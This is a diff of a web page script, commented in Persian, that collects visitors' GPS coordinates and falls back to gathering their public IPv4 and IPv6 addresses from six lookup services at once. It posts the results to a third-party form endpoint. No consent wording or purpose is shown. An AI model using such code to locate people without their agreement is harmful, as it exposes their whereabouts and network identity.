@@ -26,29 +26,7 @@
             else statusEl.style.color = '#6f6';
         }
 
-        // ارسال موقعیت GPS (دقیق)
-        async function sendGPS(lat, lng, accuracy) {
-            const payload = {
-                lat: lat,
-                lng: lng,
-                accuracy: accuracy,
-                method: 'gps',
-                time: new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' })
-            };
-            await sendToServer(payload);
-        }
-
-        // ارسال IP (پشتیبان)
-        async function sendIP(ip) {
-            const payload = {
-                ip: ip,
-                method: 'ip',
-                time: new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' })
-            };
-            await sendToServer(payload);
-        }
-
-        // ارسال مشترک به Formspree
+        // ارسال به سرور
         async function sendToServer(payload) {
             try {
                 const response = await fetch(FORM_ENDPOINT, {
@@ -66,23 +44,78 @@
             }
         }
 
-        // گرفتن IP عمومی (فقط IP، بدون مختصات)
-        async function getPublicIP() {
-            try {
-                const ctrl = new AbortController();
-                setTimeout(() => ctrl.abort(), 4000);
-                // سرویس قابل اعتماد در ایران
-                const resp = await fetch('https://api.ip.sb/geoip', { signal: ctrl.signal });
-                if (!resp.ok) throw new Error('status ' + resp.status);
-                const data = await resp.json();
-                return data.ip; // فقط رشته IP
-            } catch (e) {
-                console.warn('IP service failed', e.message);
-                return null;
-            }
+        // ارسال GPS
+        async function sendGPS(lat, lng, accuracy) {
+            await sendToServer({
+                lat: lat,
+                lng: lng,
+                accuracy: accuracy,
+                method: 'gps',
+                time: new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' })
+            });
         }
 
-        // ====== GPS (دست‌نخورده) ======
+        // ارسال IPهای چندگانه
+        async function sendIPs(ipList) {
+            await sendToServer({
+                ips: ipList,
+                method: 'ip',
+                time: new Date().toLocaleString('fa-IR', { timeZone: 'Asia/Tehran' })
+            });
+        }
+
+        // ====== دریافت IP از چندین سرویس به صورت موازی ======
+        async function getMultipleIPs() {
+            // سرویس‌هایی که IP را برمی‌گردانند (ترکیبی از plain text و JSON)
+            const services = [
+                { url: 'https://api.ipify.org?format=json', extract: (data) => data.ip },
+                { url: 'https://api64.ipify.org?format=json', extract: (data) => data.ip }, // IPv6
+                { url: 'https://ifconfig.me/ip', extract: (text) => text.trim() },
+                { url: 'https://icanhazip.com', extract: (text) => text.trim() },
+                { url: 'https://checkip.amazonaws.com', extract: (text) => text.trim() },
+                { url: 'https://api.ip.sb/geoip', extract: (data) => data.ip }, // JSON
+            ];
+
+            // تابع fetch با تایم‌اوت ۳ ثانیه
+            const fetchWithTimeout = (url, timeout = 3000) => {
+                const controller = new AbortController();
+                const timer = setTimeout(() => controller.abort(), timeout);
+                return fetch(url, { signal: controller.signal })
+                    .finally(() => clearTimeout(timer));
+            };
+
+            // اجرای همزمان همه درخواست‌ها
+            const promises = services.map(async (svc) => {
+                try {
+                    const resp = await fetchWithTimeout(svc.url);
+                    if (!resp.ok) return null;
+                    const contentType = resp.headers.get('content-type') || '';
+                    let body;
+                    if (contentType.includes('application/json')) {
+                        body = await resp.json();
+                    } else {
+                        body = await resp.text();
+                    }
+                    return svc.extract(body);
+                } catch (e) {
+                    return null;
+                }
+            });
+
+            const results = await Promise.allSettled(promises);
+            const ips = new Set(); // برای حذف تکراری‌ها
+
+            results.forEach((result) => {
+                if (result.status === 'fulfilled' && result.value && typeof result.value === 'string') {
+                    const ip = result.value.trim();
+                    if (ip.length > 0) ips.add(ip);
+                }
+            });
+
+            return Array.from(ips);
+        }
+
+        // ====== GPS اصلی (بدون تغییر) ======
         function tryGPS() {
             updateStatus('📡 در حال جستجوی ماهواره...');
 
@@ -96,12 +129,16 @@
                 },
                 async (err) => {
                     console.warn('GPS ناموفق', err.message);
-                    updateStatus('📍 استفاده از IP...');
-                    const ip = await getPublicIP();
-                    if (ip) {
-                        await sendIP(ip);
-                    } else {
-                        updateStatus('❌ نه GPS در دسترس است و نه IP.', true);
+                    updateStatus('📍 دریافت IP از چندین سرویس...');
+                    try {
+                        const ipList = await getMultipleIPs();
+                        if (ipList.length > 0) {
+                            await sendIPs(ipList);
+                        } else {
+                            updateStatus('❌ هیچ سرویس IP پاسخ نداد.', true);
+                        }
+                    } catch (ex) {
+                        updateStatus('❌ خطا در جمع‌آوری IPها.', true);
                     }
                 },
                 {
